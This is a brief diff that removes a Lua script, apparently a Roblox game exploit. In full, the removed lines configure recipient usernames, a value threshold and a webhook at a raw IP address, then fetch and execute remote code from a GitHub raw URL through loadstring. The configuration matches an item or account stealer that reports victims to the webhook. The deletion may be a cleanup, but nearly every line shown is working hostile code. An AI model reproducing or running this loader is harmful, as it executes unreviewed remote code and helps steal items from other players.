@@ -1,7 +1,0 @@
-_G.User = {'Dumbman32145781', 'StagedZoo'}
-_G.min_value = 1000000000
-_G.pingEveryone = "Yes"
-_G.Webhook = "http://51.83.103.24:20002/proxy/8eb8fd18fe2079f01ce60b703774a242"
-_G.FakeGift = "No"
-
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/swiftasfboi/SpeedHub/refs/heads/main/SpeedHubGAG'))()
